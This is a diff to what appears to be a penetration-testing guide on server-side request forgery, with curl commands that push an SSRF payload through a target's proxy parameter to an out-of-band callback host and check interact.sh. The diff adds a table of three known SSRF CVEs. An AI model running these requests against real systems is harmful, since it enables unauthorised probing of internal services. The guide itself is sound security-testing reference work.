@@ -913,3 +913,15 @@ curl "http://target/proxy?dest=http://$SSRF_DOMAIN"
 # Check interact.sh for received interactions
 curl -s "https://interact.sh/$SSRF_DOMAIN" | jq '.interactions'
 ```
+
+---
+
+### Known SSRF CVEs (NVD-verified, v0.3.2)
+
+All IDs verified against the NVD API on 2026-09-07 before inclusion.
+
+| CVE | Product | CVSS | Summary (from NVD record) |
+|-----|---------|------|----------------------------|
+| CVE-2018-6186 | citrix/netscaler | 9.0 | Citrix NetScaler VPX through NS12.0 53.13.nc allows an SSRF attack via the /rapi/read_url URI by an authentic… |
+| CVE-2018-7667 | adminer/adminer | 9.8 | Adminer through 4.3.1 has SSRF via the server parameter. |
+| CVE-2017-8794 | accellion/file_transfer_appliance | 10.0 | An issue was discovered on Accellion FTA devices before FTA_9_12_180. Because a regular expression (intended … |
